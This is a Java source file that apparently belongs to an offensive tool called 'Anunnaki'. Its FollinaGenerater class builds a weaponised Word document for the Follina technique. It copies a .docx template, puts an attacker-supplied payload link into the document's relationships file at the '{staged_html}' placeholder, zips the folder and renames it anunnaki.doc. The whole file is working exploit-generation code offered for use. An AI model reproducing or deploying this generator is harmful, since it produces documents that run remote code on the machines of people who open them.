package follina.server.services;

import java.io.File;
import java.io.IOException;
import java.nio.file.Path;
import java.nio.file.Paths;

import org.apache.commons.io.FileUtils;

import follina.server.Anunnaki;

public class FollinaGenerater implements Runnable {

	// Constante template
	private final static String TEMPLATE_DIRECTORY = "doc";
	private final static String TEMPORARY_WORD_DIRECTORY = "TempWord";
	private final static String OUTPUT_ZIP = "anunnaki.zip";
	private final static String OUTPUT_DOC = "anunnaki.doc";

	private String payloadLink;

	public FollinaGenerater(String payloadLink) {
		this.payloadLink = payloadLink;
	}


	@Override
	public void run() {
		try {
			File temporaryWork = new File(TEMPORARY_WORD_DIRECTORY);
			if (temporaryWork.exists())
				temporaryWork.delete();

			temporaryWork.mkdir();

			FileUtils.copyDirectory(new File(TEMPLATE_DIRECTORY), temporaryWork);

			Path stepdirectory = Paths.get(TEMPORARY_WORD_DIRECTORY, "word", "_rels", "document.xml.rels");
			String documentXml = Utils.readFileContent(stepdirectory.toString());
			documentXml = documentXml.replace("{staged_html}", this.payloadLink);
			Utils.writeFileContent(stepdirectory.toString(), documentXml);

			/*
			 * Making Our word to a doc file , i create .zip then i ll rename it .doc
			 * because every package origin is .zip
			 * 
			 */
			Utils.pack(TEMPORARY_WORD_DIRECTORY, OUTPUT_ZIP);
			File outputZip = new File(OUTPUT_ZIP);
			outputZip.renameTo(new File(OUTPUT_DOC));
			temporaryWork.delete();
		} catch (IOException e) {
			e.printStackTrace();
			Anunnaki.stopApp();
		}
	}
	
	public static void clean() {
		File tempFile = new File(TEMPORARY_WORD_DIRECTORY);
		File file = new File(OUTPUT_DOC);
		File zip = new File(OUTPUT_ZIP);
		if(tempFile.exists())
			try {
				FileUtils.deleteDirectory(new File(TEMPORARY_WORD_DIRECTORY));
			} catch (IOException e) {
				e.printStackTrace();
			}
		if(file.exists())
			file.delete();
		if(zip.exists())
			zip.delete();
	}

}
